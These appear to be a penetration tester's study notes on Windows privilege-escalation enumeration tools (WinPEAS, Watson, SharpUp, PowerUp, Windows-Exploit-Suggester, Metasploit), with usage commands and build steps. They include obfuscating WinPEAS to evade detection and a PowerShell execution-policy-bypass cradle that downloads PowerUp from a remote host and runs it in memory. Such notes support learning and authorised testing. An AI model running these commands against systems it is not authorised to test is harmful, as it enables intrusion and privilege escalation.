# Automated Issues Finders

## WinPEAS

- Tool for finding priv esc paths in windows
- Performs a lot of checks to then go through
- uses colour highlighting to find information quickly

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

- .exe and .bat file
- can download obfuscated version or compile

### Commands

```
winpeas.exe cmd searchall searchfast #cmd commands, search all filenames and avoid sleepig (noisy - CTFs)
winpeas.exe #Will execute all checks except the ones that use a CMD
winpeas.exe cmd #All checks
winpeas.exe systeminfo userinfo #Only systeminfo and userinfo checks executed
winpeas.exe notcolor #Do not color the output
```

### Compile

- install dotfuscator
- **Compile** winpeas in VisualStudio
- **Open dotfuscator** app
- **Open** in dotfuscator **winPEAS.exe compiled** before and **Microsoft.Win32.TaskScheduler.dll** (is in the same folder as winPEAS.exe)
- Click on **Build**
- The **single, minimized and obfuscated binary** will appear in a **folder called Dotfuscator inside the folder were winPEAS.exe** and the DLL were (this location will be saved by dotfuscator and by default all the following builds will appear in this folder).

## Watson

https://github.com/rasta-mouse/Watson

- Enumerates missing KB's and suggests exploits
- You need to know the version of .net running on the target system

```
C:\windows\microsoft.net\framework\
```



### Compiling

- Open in Visual Studio
- Solution Explorer > Properties > Target Framework
- Make the value align with the version of .net running on the target
- Build the project

### Commands

```
C:/> watson.exe
```

## SharpUp

https://github.com/GhostPack/SharpUp

- C# port of PowerUp

### Compile

- Open the .sln in Visual Studio
- choose "release"
- Build

### commands

```
SharpUp.exe audit
```

## PowerUp

https://github.com/PowerShellMafia/PowerSploit/tree/dev/Privesc

### Commands

```
powershell.exe -nop -exec bypass
Import-Module PowerUp.ps1
Invoke-AllChecks
```

To Download and run in memory:

```
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/PowerUp.ps1');Invoke-AllChecks"
```

## Windows-Exploit-Suggester

https://github.com/AonCyberLabs/Windows-Exploit-Suggester

- You run locally on your machine, and give it the systeminfo input from the system you are reviewing

### Commands

```
windows-exploit-suggester.py --update

windows-exploit-suggester.py --database blah.xlsx --systeminfo blah.txt
```

## Metasploit

- Metasploit has a post exploitation module

```
run post/multi/recon/local_exploit_suggester
```

